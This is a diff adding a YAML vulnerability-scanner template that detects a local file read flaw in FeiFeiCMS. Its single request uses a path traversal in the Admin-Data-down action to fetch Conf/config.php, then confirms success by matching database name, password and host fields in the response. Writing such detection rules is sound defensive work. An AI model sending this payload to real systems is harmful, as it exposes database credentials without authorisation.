@@ -1,0 +1,15 @@
+id: feifeicms-lfr
+
+info:
+    name: FeiFeiCMS lfr
+    author: jinqi
+    severity: high
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /index.php?s=Admin-Data-down&id=../../Conf/config.php
+        expression: response.status == 200 && response.body.bcontains(b"<?php") && response.body.bcontains(b"db_name") && response.body.bcontains(b"db_pwd") && response.body.bcontains(b"db_host")
+expression: r0()
+
